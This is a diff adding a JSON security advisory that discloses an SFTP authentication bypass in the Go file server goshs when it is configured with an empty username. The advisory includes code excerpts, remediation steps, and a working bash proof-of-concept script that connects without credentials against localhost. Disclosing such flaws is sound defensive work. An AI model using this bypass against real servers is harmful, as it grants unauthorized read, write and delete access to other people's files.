@@ -1,0 +1,65 @@
+{
+  "id": "GHSA-c29w-qq4m-2gcv",
+  "modified": "2026-04-14T22:31:28.195111Z",
+  "published": "2026-04-14T22:28:30Z",
+  "summary": "Empty-username SFTP password authentication bypass in goshs",
+  "details": "### Summary\ngoshs contains an SFTP authentication bypass when the documented empty-username basic-auth syntax is used. If the server is started with `-b ':pass'` together with `-sftp`, goshs accepts that configuration but does not install any SFTP password handler. As a result, an unauthenticated network attacker can connect to the SFTP service and access files without a password. I reproduced this on the latest release `v2.0.0-beta.5`.\n\n### Details\nThe help text explicitly documents empty usernames as valid authentication input:\n\n- `options/options.go:264-266` says `Use basic authentication (user:pass - user can be empty)`\n\nThe SFTP sanity check only requires that either `-b` or `--sftp-keyfile` is present:\n\n```go\nif opts.SFTP \u0026\u0026 (opts.BasicAuth == \"\" \u0026\u0026 opts.SFTPKeyFile == \"\") {\n    logger.Fatal(\"When using SFTP you need to either specify an authorized keyfile using -sfk or username and password using -b\")\n}\n```\n\nThat parsing logic then splits `-b ':pass'` into an empty username and a non-empty password:\n\n```go\nauth := strings.SplitN(opts.BasicAuth, \":\", 2)\nopts.Username = auth[0]\nopts.Password = auth[1]\n```\n\nBut the SFTP server only installs a password handler if both the username and password are non-empty:\n\n```go\nif s.Username != \"\" \u0026\u0026 s.Password != \"\" {\n    sshServer.PasswordHandler = func(ctx ssh.Context, password string) bool {\n        return ctx.User() == s.Username \u0026\u0026 password == s.Password\n    }\n}\n```\n\nWith `-b ':pass'`, that condition is false, so no password authentication is enforced for SFTP sessions.\n\nRelevant source locations:\n\n- `options/options.go:264-266`\n- `sanity/checks.go:82-85`\n- `sanity/checks.go:102-109`\n- `sftpserver/sftpserver.go:82-85`\n\n### PoC\nI manually verified the issue on `v2.0.0-beta.5`. The server was started with the documented empty-user auth syntax `-b ':pass'`, but an SFTP client still downloaded a file without supplying any key or password.\n\nManual verification commands used:\n\n`Terminal 1`\n\n```bash\ncd '/Users/r1zzg0d/Documents/CVE hunting/targets/goshs_beta5'\ngo build -o /tmp/goshs_beta5 ./\n\nrm -rf /tmp/goshs_authless_root /tmp/authless_sftp.txt\nmkdir -p /tmp/goshs_authless_root\nprintf 'root file\\n' \u003e /tmp/goshs_authless_root/test.txt\n\n/tmp/goshs_beta5 -p 18102 -sftp -d /tmp/goshs_authless_root --sftp-port 2223 -b ':pass'\n```\n\n`Terminal 2`\n\n```bash\nprintf 'get /tmp/goshs_authless_root/test.txt /tmp/authless_sftp.txt\\nbye\\n' | \\\nsftp -o PreferredAuthentications=none,password -o PubkeyAuthentication=no \\\n-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -P 2223 -b - foo@127.0.0.1\n\ncat /tmp/authless_sftp.txt\n```\n\nExpected result:\n\n- the SFTP session succeeds without a key\n- there is no password prompt\n- `cat /tmp/authless_sftp.txt` prints `root file`\n\nPoC Video 1:\n\nhttps://github.com/user-attachments/assets/1ef1539d-bf29-419b-a26e-46aa405effb4\n\n\nSingle-script verification:\n\n```bash\n'/Users/r1zzg0d/Documents/CVE hunting/output/poc/gosh_poc2'\n```\n\n`gosh_poc2` script content:\n\n```bash\n#!/usr/bin/env bash\nset -euo pipefail\n\nREPO='/Users/r1zzg0d/Documents/CVE hunting/targets/goshs_beta5'\nBIN='/tmp/goshs_beta5_sftp_empty_user'\nROOT='/tmp/goshs_authless_root'\nDOWNLOAD='/tmp/authless_sftp.txt'\nHTTP_PORT='18102'\nSFTP_PORT='2223'\nSERVER_PID=\"\"\n\ncleanup() {\n  if [[ -n \"${SERVER_PID:-}\" ]]; then\n    kill \"${SERVER_PID}\" \u003e/dev/null 2\u003e\u00261 || true\n    wait \"${SERVER_PID}\" 2\u003e/dev/null || true\n  fi\n}\ntrap cleanup EXIT\n\necho '[1/5] Building goshs beta.5'\ncd \"${REPO}\"\ngo build -o \"${BIN}\" ./\n\necho '[2/5] Preparing test root'\nrm -rf \"${ROOT}\" \"${DOWNLOAD}\"\nmkdir -p \"${ROOT}\"\nprintf 'root file\\n' \u003e \"${ROOT}/test.txt\"\n\necho \"[3/5] Starting goshs with documented empty-user auth syntax on SFTP ${SFTP_PORT}\"\n\"${BIN}\" -p \"${HTTP_PORT}\" -sftp -d \"${ROOT}\" --sftp-port \"${SFTP_PORT}\" -b ':pass' \\\n  \u003e/tmp/gosh_poc2.log 2\u003e\u00261 \u0026\nSERVER_PID=$!\n\nfor _ in $(seq 1 40); do\n  if python3 - \u003c\u003cPY\nimport socket\ns = socket.socket()\ntry:\n    s.connect((\"127.0.0.1\", ${SFTP_PORT}))\n    raise SystemExit(0)\nexcept OSError:\n    raise SystemExit(1)\nfinally:\n    s.close()\nPY\n  then\n    break\n  fi\n  sleep 0.25\ndone\n\necho '[4/5] Connecting without password or key'\nprintf \"get ${ROOT}/test.txt ${DOWNLOAD}\\nbye\\n\" | \\\n  sftp -o PreferredAuthentications=none,password -o PubkeyAuthentication=no \\\n  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -P \"${SFTP_PORT}\" -b - foo@127.0.0.1\n\necho '[5/5] Verifying unauthenticated file access'\necho \"Downloaded content: $(cat \"${DOWNLOAD}\")\"\n\nif [[ \"$(cat \"${DOWNLOAD}\")\" == 'root file' ]]; then\n  echo '[RESULT] VULNERABLE: empty-user SFTP password auth leaves the server unauthenticated'\nelse\n  echo '[RESULT] NOT REPRODUCED'\n  exit 1\nfi\n```\n\nPoC Video 2:\n\nhttps://github.com/user-attachments/assets/b8f632b7-20f4-49f1-b207-b2502af49b77\n\n\n\n### Impact\nThis is an authentication bypass in the SFTP service. An external attacker does not need valid credentials to access the exposed SFTP root when the operator follows the documented `-b ':pass'` syntax. That enables unauthenticated reading, uploading, renaming, and deleting of files within the configured SFTP root, depending on server mode and filesystem permissions.\n\n### Remediation\nSuggested fixes:\n\n1. Install the SFTP password handler whenever a password is configured, even if the username is an empty string.\n2. If empty usernames are not intended for SFTP, reject `-b ':pass'` during option validation whenever `-sftp` is enabled.\n3. Add an integration test that starts SFTP with `-b ':pass'` and verifies that unauthenticated sessions are rejected.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/patrickhener/goshs",
+        "purl": "pkg:golang/github.com/patrickhener/goshs"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "1.1.4"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-c29w-qq4m-2gcv/GHSA-c29w-qq4m-2gcv.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/patrickhener/goshs/v2",
+        "purl": "pkg:golang/github.com/patrickhener/goshs/v2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.0.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-c29w-qq4m-2gcv/GHSA-c29w-qq4m-2gcv.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/patrickhener/goshs/security/advisories/GHSA-c29w-qq4m-2gcv"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/patrickhener/goshs"
+    }
+  ]
+}
